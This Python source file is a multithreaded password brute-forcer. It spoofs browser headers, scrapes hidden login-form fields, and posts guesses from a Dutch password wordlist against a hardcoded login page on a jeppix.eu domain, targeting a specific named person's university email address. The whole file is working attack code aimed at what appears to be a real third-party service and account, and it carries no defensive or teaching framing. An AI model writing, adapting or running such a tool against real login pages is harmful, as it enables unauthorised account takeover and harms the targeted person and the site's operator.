from io import BytesIO
from queue import Queue
from lxml import etree

import threading
import requests
import sys
import time as tm

SUCCESS = "Welcome to"
WORDLIST = "SecLists\Passwords\dutch_passwordlist.txt"
USERNAME = "m.feltovic@student.tue.nl"
TARGET_URL = "https://pls.jeppix.eu:443/login/"  # "https://pdk.jeppix.eu/admin"
THREADS = 12

overr_headers = {
    'Upgrade-Insecure-Requests': '1',
    'User-Agent':  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'sec-ch-ua': '"Microsoft Edge";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'Accept-Language': 'en-US,en;q=0.9,sk;q=0.8'
}
overr_post_headers = {
    'Referer': TARGET_URL,
    'Cache-Control': 'max-age=0'
}


class Bruter():
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'Brute Force Attack beginning on {url}.\n')
        print("Finished the set where username = %s\n" % username)

    def run_bruteforce(self, passwords):
        for _ in range(THREADS):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()

    #function executed by each thread
    def web_bruter(self, passwords):
        times = []
        session = requests.Session()
        resp0 = session.get(self.url, headers=overr_headers)
        params = get_params(resp0.content)
        while not passwords.empty() and not self.found:
            start_time = tm.time()
            # time.sleep(0.0001)
            passwd = passwords.get()
            print(f'Trying username/passwod {self.username}/{passwd:<10}')
            params['email'] = self.username
            params['password'] = passwd
            resp1 = session.post(self.url, data=params, headers={**overr_headers, **overr_post_headers})
            if SUCCESS in resp1.content.decode():
                self.found = True
                print(f'\nBruteforcing successful.')
                print(f"Email is {self.username}")
                print("Password is %s " % passwd)
                print("Average time for a try: " + str(sum(times)/len(times)))
            else:
                params = get_params(resp1.content)
            times.append(tm.time() - start_time)

#adds passwords into Queue object
def get_words():
    with open(WORDLIST, encoding="utf8") as file:
        raw_words = file.read()
    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words

#parses HTML elements from response.content
def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for element in tree.findall('//input'):
        name = element.get('name')
        if name is not None:
            params[name] = element.get('value', None)
    return params


if __name__ == '__main__':
    words = get_words()
    b = Bruter(USERNAME, TARGET_URL)
    b.run_bruteforce(words)
